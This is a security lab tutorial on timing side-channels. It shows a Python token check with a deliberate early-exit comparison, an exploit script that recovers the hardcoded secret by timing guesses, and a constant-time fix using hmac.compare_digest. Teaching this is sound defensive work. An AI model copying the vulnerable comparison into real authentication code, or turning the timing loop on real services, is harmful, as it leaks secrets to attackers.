# 06 - Hands-on Lab: Timing Side-Channel

This lab demonstrates a non-invasive side-channel attack on software. We will exploit a timing leak in a string comparison function to guess a secret token character by character.

## The Vulnerable Code
A classic mistake is using the standard equality operator `==` to verify secrets like MACs or API tokens. Standard string comparison stops checking as soon as it finds a mismatch, returning faster for early failures.

Create `vulnerable_server.py`:
```python
import time

SECRET_TOKEN = "secr3t_key"

def verify_token_vulnerable(user_input):
    if len(user_input) != len(SECRET_TOKEN):
        return False
    
    # Vulnerable comparison: loops byte by byte
    for i in range(len(SECRET_TOKEN)):
        if user_input[i] != SECRET_TOKEN[i]:
            return False
        # Artificial delay to simulate a micro-controller or heavy operation
        time.sleep(0.01) 
        
    return True
```

## The Exploit Script
We can measure how long the function takes to execute. If it takes slightly longer, we know we guessed the correct character at that position!

Create `exploit.py`:
```python
import time
from vulnerable_server import verify_token_vulnerable

charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
guessed_token = ""
target_length = 10

print("Starting timing attack...")

for i in range(target_length):
    max_time = 0
    best_char = ""
    
    for char in charset:
        test_payload = guessed_token + char + "A" * (target_length - 1 - i)
        
        start_time = time.time()
        verify_token_vulnerable(test_payload)
        end_time = time.time()
        
        duration = end_time - start_time
        
        if duration > max_time:
            max_time = duration
            best_char = char
            
    guessed_token += best_char
    print(f"Cracking: {guessed_token}")

print(f"Recovered Token: {guessed_token}")
```
*Run the exploit. You will see it accurately deduce `secr3t_key` by simply measuring the time taken!*

## The Secure Fix
To fix timing leaks, you must use **constant-time** comparison functions. The time taken to compare two strings must depend *only* on their length, not their contents.

Create `secure_server.py`:
```python
import time
import hmac

SECRET_TOKEN = "secr3t_key"

def verify_token_secure(user_input):
    if len(user_input) != len(SECRET_TOKEN):
        return False
        
    # Constant-time comparison
    # It compares the entire string regardless of where mismatches occur
    return hmac.compare_digest(user_input, SECRET_TOKEN)
```
*If you point the exploit script at `verify_token_secure`, it will fail because all comparisons take the exact same amount of time.*
